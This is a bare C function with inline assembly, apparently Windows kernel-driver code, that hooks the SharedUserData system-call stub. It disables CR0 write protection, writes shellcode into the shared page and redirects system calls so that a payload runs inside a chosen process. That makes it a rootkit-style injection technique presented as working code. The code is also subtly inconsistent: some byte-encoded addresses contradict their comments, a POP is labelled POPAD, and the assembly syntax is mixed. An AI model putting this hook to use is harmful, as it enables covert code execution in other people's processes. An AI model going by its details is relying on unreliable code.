NTSTATUS SharedUserDataHook(DWORD dwTargetPid)
{
 char usermodepayload[] = { 0x90, // NOP
                            0xC3  // RET
                          };

 char passthrough[] = 
{ 
  0x50,                               // PUSH EAX
  0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, // MOV EAX,DWORD PTR FS:[18]
  0x8B, 0x40, 0x20,                   // MOV EAX,DWORD PTR DS:[EAX + 20]
  0x3B, 0x05, 0xF4, 0x03, 0xFE, 0x7F, // CMP EAX,DWORD PTR DS:[7FFE03FC]
  0x75, 0x07,                         // JNZ exit
  0xB8, 0x00, 0x05, 0xFE, 0x7F,       // MOV EAX,0x7FFE0500
  0xFF, 0xD0,                         // CALL EAX
  /* exit: */        
  0x58,                               // POPAD
  0xFF, 0x25, 0xF8, 0x03, 0xFE, 0x7F, // JMP DWORD PTR DS:[7FFE03F8]
};

     DWORD *pdwPassThruAddr =           (DWORD *) 0x7FFE0400;
     DWORD *pdwTargetPidAddr =          (DWORD *) 0x7FFE03FC;
     DWORD *pdwNewSystemCallStub =      (DWORD *) 0x7FFE03F8;
     DWORD *pdwOriginalSystemCallStub = (DWORD *) 0x7FFE0300;
     DWORD *pdwUsermodePayloadAddr =    (DWORD *) 0x7FFE0500;

     // Disable write protection

     _asm {
            push eax
            mov eax, cr0
            and eax, not 10000h
            mov cr0, eax
            pop eax
          }

     memcpy((VOID *)0x7FFE0400, passthrough, sizeof(passthrough)); 
     memcpy((VOID *)0x7FFE0500, usermodepayload, sizeof(usermodepayload)); 

     *pdwTargetPidAddr = dwTargetPid;

     // Disable interrupts

     asm { cli }

     *pdwNewSystemCallStub = *pdwOriginalSystemCallStub;
     *pdwOriginalSystemCallStub = (DWORD) pdwPassThruAddr;

     // Re-enable interrupts

     asm { sti }

     // Re-enable memory protection

     asm { push eax       
           mov eax, cr0
           or eax, 10000h 
           mov cr0, eax
           pop eax
         }
     
     return STATUS_SUCCESS;
}
